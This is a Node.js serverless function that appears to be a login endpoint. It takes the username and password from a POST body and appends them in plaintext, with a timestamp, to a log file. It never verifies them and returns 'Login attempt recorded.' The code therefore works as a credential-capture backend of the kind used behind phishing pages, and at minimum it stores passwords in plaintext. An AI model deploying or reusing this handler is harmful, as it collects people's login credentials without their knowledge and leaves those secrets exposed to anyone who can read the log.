const fs = require('fs');
const path = require('path');

exports.handler = async function (event, context) {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ ok: false, message: 'Method not allowed' }),
      headers: { 'Content-Type': 'application/json' },
    };
  }

  try {
    const body = JSON.parse(event.body || '{}');
    const username = body.username || 'unknown';
    const password = body.password || '';
    const timestamp = new Date().toISOString();
    const logDir = path.join(__dirname, '..', '..', 'logs');
    const logFile = path.join(logDir, 'login-attempts.txt');

    fs.mkdirSync(logDir, { recursive: true });
    fs.appendFileSync(logFile, `[${timestamp}] username=${username} password=${password}\n`, 'utf8');

    return {
      statusCode: 200,
      body: JSON.stringify({ ok: true, message: 'Login attempt recorded.' }),
      headers: { 'Content-Type': 'application/json' },
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ ok: false, message: 'Unable to log attempt' }),
      headers: { 'Content-Type': 'application/json' },
    };
  }
};
